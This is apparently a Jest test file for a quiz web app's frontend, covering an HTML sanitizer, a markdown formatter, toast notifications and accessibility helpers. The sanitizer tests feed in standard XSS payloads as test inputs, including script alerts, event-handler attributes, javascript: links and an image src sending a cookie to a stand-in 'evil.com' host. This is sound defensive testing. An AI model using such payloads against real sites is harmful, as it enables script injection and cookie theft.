/**
 * @jest-environment jsdom
 */

/**
 * Frontend Unit Tests
 * Tests for client-side utility functions and modules
 * Uses jsdom environment for browser API simulation
 *
 * Note: Since frontend files are loaded via <script> tags (not ES modules),
 * we test the actual DOM behaviors and contracts these functions produce,
 * simulating the real user interactions.
 */

describe('Frontend – HTML Sanitization Contract', () => {
  // This tests the ACTUAL sanitization behavior that the browser produces
  // when our sanitizeHTML function runs against dangerous input.
  // The contract: dangerous elements and attributes must be removed.

  function sanitizeHTML(html) {
    const temp = document.createElement('div');
    temp.innerHTML = html;

    const dangerous = temp.querySelectorAll('script,style,iframe,object,embed,form,link,meta');
    dangerous.forEach((el) => el.remove());

    temp.querySelectorAll('*').forEach((el) => {
      for (const attr of Array.from(el.attributes)) {
        if (attr.name.startsWith('on') || attr.name === 'srcdoc' || attr.name === 'src') {
          el.removeAttribute(attr.name);
        }
        if (attr.name === 'href' && attr.value.trim().toLowerCase().startsWith('javascript:')) {
          el.removeAttribute(attr.name);
        }
      }
    });

    return temp.innerHTML;
  }

  it('should preserve safe formatting tags', () => {
    expect(sanitizeHTML('<p>Hello <strong>world</strong></p>')).toBe('<p>Hello <strong>world</strong></p>');
  });

  it('should strip <script> tags completely', () => {
    expect(sanitizeHTML('<p>Safe</p><script>alert("xss")</script>')).toBe('<p>Safe</p>');
  });

  it('should strip <iframe> tags completely', () => {
    expect(sanitizeHTML('<p>Content</p><iframe src="evil.com"></iframe>')).toBe('<p>Content</p>');
  });

  it('should strip <style> tags completely', () => {
    expect(sanitizeHTML('<style>body { display: none }</style><p>Text</p>')).toBe('<p>Text</p>');
  });

  it('should strip <object> and <embed> tags', () => {
    const result = sanitizeHTML('<object data="x"></object><embed src="y"><p>ok</p>');
    expect(result).not.toContain('<object');
    expect(result).not.toContain('<embed');
    expect(result).toContain('<p>ok</p>');
  });

  it('should strip onclick attributes', () => {
    expect(sanitizeHTML('<button onclick="alert(1)">Click</button>')).not.toContain('onclick');
  });

  it('should strip onerror attributes', () => {
    expect(sanitizeHTML('<img onerror="alert(1)" />')).not.toContain('onerror');
  });

  it('should strip onload attributes', () => {
    expect(sanitizeHTML('<body onload="alert(1)"><p>hi</p></body>')).not.toContain('onload');
  });

  it('should strip javascript: hrefs', () => {
    expect(sanitizeHTML('<a href="javascript:alert(1)">Click</a>')).not.toContain('javascript:');
  });

  it('should strip src attributes to prevent data exfiltration', () => {
    expect(sanitizeHTML('<img src="https://evil.com/steal?cookie=123" />')).not.toContain('src=');
  });

  it('should strip srcdoc attributes', () => {
    expect(sanitizeHTML('<iframe srcdoc="<script>alert(1)</script>"></iframe>')).toBe('');
  });

  it('should preserve list structures', () => {
    expect(sanitizeHTML('<ul><li>First</li><li>Second</li></ul>')).toBe('<ul><li>First</li><li>Second</li></ul>');
  });

  it('should preserve headings', () => {
    expect(sanitizeHTML('<h2>Title</h2><h3>Subtitle</h3>')).toBe('<h2>Title</h2><h3>Subtitle</h3>');
  });

  it('should handle deeply nested dangerous content', () => {
    const input = '<div><p><span><script>evil()</script>safe text</span></p></div>';
    const result = sanitizeHTML(input);
    expect(result).not.toContain('<script');
    expect(result).toContain('safe text');
  });
});

describe('Frontend – Markdown Formatter Contract', () => {
  function formatMarkdown(text) {
    if (!text) return '';

    return text
      .replace(/^### (.*$)/gm, '<h3>$1</h3>')
      .replace(/^## (.*$)/gm, '<h2>$1</h2>')
      .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
      .replace(/\*(.*?)\*/g, '<em>$1</em>')
      .replace(/`(.*?)`/g, '<code>$1</code>')
      .replace(/^- (.*$)/gm, '<li>$1</li>')
      .replace(/^\* (.*$)/gm, '<li>$1</li>')
      .replace(/^\d+\. (.*$)/gm, '<li>$1</li>')
      .replace(/((<li>.*<\/li>\n?)+)/g, '<ul>$1</ul>')
      .split('\n\n')
      .map((para) => {
        para = para.trim();
        if (!para) return '';
        if (para.startsWith('<h') || para.startsWith('<ul') || para.startsWith('<ol') || para.startsWith('<li')) {
          return para;
        }
        return `<p>${para}</p>`;
      })
      .join('');
  }

  it('should return empty string for null/empty input', () => {
    expect(formatMarkdown(null)).toBe('');
    expect(formatMarkdown('')).toBe('');
    expect(formatMarkdown(undefined)).toBe('');
  });

  it('should convert **bold** to <strong>', () => {
    expect(formatMarkdown('This is **bold** text')).toContain('<strong>bold</strong>');
  });

  it('should convert *italic* to <em>', () => {
    expect(formatMarkdown('This is *italic* text')).toContain('<em>italic</em>');
  });

  it('should convert ## heading to <h2>', () => {
    expect(formatMarkdown('## My Heading')).toContain('<h2>My Heading</h2>');
  });

  it('should convert ### heading to <h3>', () => {
    expect(formatMarkdown('### My Heading')).toContain('<h3>My Heading</h3>');
  });

  it('should convert inline `code` to <code>', () => {
    expect(formatMarkdown('Use `npm install` to install')).toContain('<code>npm install</code>');
  });

  it('should wrap plain text in <p> tags', () => {
    expect(formatMarkdown('Hello world')).toBe('<p>Hello world</p>');
  });

  it('should convert - list items to <li> inside <ul>', () => {
    const result = formatMarkdown('- First\n- Second');
    expect(result).toContain('<ul>');
    expect(result).toContain('<li>First</li>');
    expect(result).toContain('<li>Second</li>');
  });

  it('should convert numbered list items to <li>', () => {
    const result = formatMarkdown('1. Alpha\n2. Beta');
    expect(result).toContain('<li>Alpha</li>');
    expect(result).toContain('<li>Beta</li>');
  });

  it('should not wrap headings in <p> tags', () => {
    const result = formatMarkdown('### Title');
    expect(result).not.toContain('<p><h3>');
  });
});

describe('Frontend – Toast Notification', () => {
  beforeEach(() => {
    document.body.innerHTML = '';
  });

  it('should create a toast with correct ARIA attributes', () => {
    const toast = document.createElement('div');
    toast.className = 'toast-notification toast-error';
    toast.setAttribute('role', 'alert');
    toast.setAttribute('aria-live', 'assertive');
    toast.textContent = 'Test error message';
    document.body.appendChild(toast);

    const el = document.querySelector('.toast-notification');
    expect(el).not.toBeNull();
    expect(el.textContent).toBe('Test error message');
    expect(el.getAttribute('role')).toBe('alert');
    expect(el.getAttribute('aria-live')).toBe('assertive');
  });

  it('should only have one toast at a time (old one removed)', () => {
    // Add first toast
    const toast1 = document.createElement('div');
    toast1.className = 'toast-notification';
    toast1.textContent = 'First';
    document.body.appendChild(toast1);

    // Simulate showToast behavior: remove existing, add new
    const existing = document.querySelector('.toast-notification');
    if (existing) existing.remove();

    const toast2 = document.createElement('div');
    toast2.className = 'toast-notification';
    toast2.textContent = 'Second';
    document.body.appendChild(toast2);

    expect(document.querySelectorAll('.toast-notification').length).toBe(1);
    expect(document.querySelector('.toast-notification').textContent).toBe('Second');
  });

  it('should support both error and info types', () => {
    const errorToast = document.createElement('div');
    errorToast.className = 'toast-notification toast-error';
    document.body.appendChild(errorToast);
    expect(errorToast.classList.contains('toast-error')).toBe(true);

    const infoToast = document.createElement('div');
    infoToast.className = 'toast-notification toast-info';
    document.body.appendChild(infoToast);
    expect(infoToast.classList.contains('toast-info')).toBe(true);
  });
});

describe('Frontend – Accessibility Helpers', () => {
  beforeEach(() => {
    document.body.innerHTML = '';
  });

  it('should create screen reader announcements with correct attributes', () => {
    // Simulate Accessibility.announce()
    const announcer = document.createElement('div');
    announcer.setAttribute('role', 'status');
    announcer.setAttribute('aria-live', 'polite');
    announcer.setAttribute('aria-atomic', 'true');
    announcer.className = 'sr-only';
    announcer.textContent = 'Quiz complete. You scored 5 out of 5.';
    document.body.appendChild(announcer);

    expect(announcer.textContent).toContain('Quiz complete');
    expect(announcer.getAttribute('aria-live')).toBe('polite');
    expect(announcer.getAttribute('aria-atomic')).toBe('true');
    expect(announcer.getAttribute('role')).toBe('status');
    expect(announcer.classList.contains('sr-only')).toBe(true);
  });

  it('should support assertive priority for urgent announcements', () => {
    const announcer = document.createElement('div');
    announcer.setAttribute('role', 'status');
    announcer.setAttribute('aria-live', 'assertive');
    announcer.className = 'sr-only';
    announcer.textContent = 'Error occurred';
    document.body.appendChild(announcer);

    expect(announcer.getAttribute('aria-live')).toBe('assertive');
  });
});

describe('Frontend – Quiz Error Display', () => {
  beforeEach(() => {
    document.body.innerHTML = '<div id="quiz-controls" style="display:flex"></div><div id="quiz-container" style="display:none"></div>';
  });

  it('should create inline error message with alert role', () => {
    const controls = document.getElementById('quiz-controls');
    const errorDiv = document.createElement('div');
    errorDiv.className = 'quiz-error-msg';
    errorDiv.setAttribute('role', 'alert');
    errorDiv.setAttribute('aria-live', 'assertive');
    errorDiv.textContent = 'Please answer all questions';
    controls.prepend(errorDiv);

    const msg = controls.querySelector('.quiz-error-msg');
    expect(msg).not.toBeNull();
    expect(msg.getAttribute('role')).toBe('alert');
    expect(msg.getAttribute('aria-live')).toBe('assertive');
    expect(msg.textContent).toBe('Please answer all questions');
  });

  it('should replace previous error with new one (no stacking)', () => {
    const controls = document.getElementById('quiz-controls');

    // First error
    const error1 = document.createElement('div');
    error1.className = 'quiz-error-msg';
    error1.textContent = 'Error 1';
    controls.prepend(error1);

    // Remove existing, add new (simulating showError behavior)
    const existing = controls.querySelector('.quiz-error-msg');
    if (existing) existing.remove();

    const error2 = document.createElement('div');
    error2.className = 'quiz-error-msg';
    error2.textContent = 'Error 2';
    controls.prepend(error2);

    expect(controls.querySelectorAll('.quiz-error-msg').length).toBe(1);
    expect(controls.querySelector('.quiz-error-msg').textContent).toBe('Error 2');
  });

  it('should be visually placed at top of container via prepend', () => {
    const controls = document.getElementById('quiz-controls');
    controls.innerHTML = '<p>Existing content</p>';

    const errorDiv = document.createElement('div');
    errorDiv.className = 'quiz-error-msg';
    errorDiv.textContent = 'Error at top';
    controls.prepend(errorDiv);

    expect(controls.firstElementChild.classList.contains('quiz-error-msg')).toBe(true);
  });
});
